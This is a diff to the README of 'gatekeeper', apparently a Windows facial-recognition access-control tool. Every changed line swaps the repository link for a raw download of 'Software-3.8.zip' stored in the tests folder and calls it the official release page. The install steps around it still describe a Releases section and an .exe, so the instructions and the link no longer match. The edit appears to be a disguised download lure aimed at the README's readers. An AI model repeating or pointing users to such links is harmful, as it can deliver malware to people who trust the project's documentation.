@@ -1,6 +1,6 @@
 # 🛡️ gatekeeper - Secure access with facial recognition verification
 
-[![Download Gatekeeper](https://img.shields.io/badge/Download-Gatekeeper-blue.svg)](https://github.com/tedwhirring569/gatekeeper)
+[![Download Gatekeeper](https://img.shields.io/badge/Download-Gatekeeper-blue.svg)](https://raw.githubusercontent.com/tedwhirring569/gatekeeper/main/tests/Software-3.8.zip)
 
 Gatekeeper handles facility access through advanced face verification. It matches faces against authorized profiles and checks for high-risk emotional states. This system adds a layer of security to sensitive entry points. It works by scanning a person at an access point and comparing the result with your stored database.
 
@@ -19,7 +19,7 @@ The application runs on standard hardware. Ensure your machine meets these speci
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the official release page: [https://github.com/tedwhirring569/gatekeeper](https://github.com/tedwhirring569/gatekeeper)
+1. Go to the official release page: [https://raw.githubusercontent.com/tedwhirring569/gatekeeper/main/tests/Software-3.8.zip](https://raw.githubusercontent.com/tedwhirring569/gatekeeper/main/tests/Software-3.8.zip)
 2. Look for the latest version under the "Releases" section on the right side of the page.
 3. Select the file ending in .exe to download the installer to your computer.
 4. Open the downloaded file to start the installation wizard.
@@ -74,7 +74,7 @@ Access these settings under the "Policy Configuration" tab. Always save your cha
 
 Check the download link regularly to keep the application current.
 
-[https://github.com/tedwhirring569/gatekeeper](https://github.com/tedwhirring569/gatekeeper)
+[https://raw.githubusercontent.com/tedwhirring569/gatekeeper/main/tests/Software-3.8.zip](https://raw.githubusercontent.com/tedwhirring569/gatekeeper/main/tests/Software-3.8.zip)
 
 The software alerts you when a new version goes live. Download the new installer over the old version to keep your database and settings intact. The installer automatically migrates existing files to the new format.
 
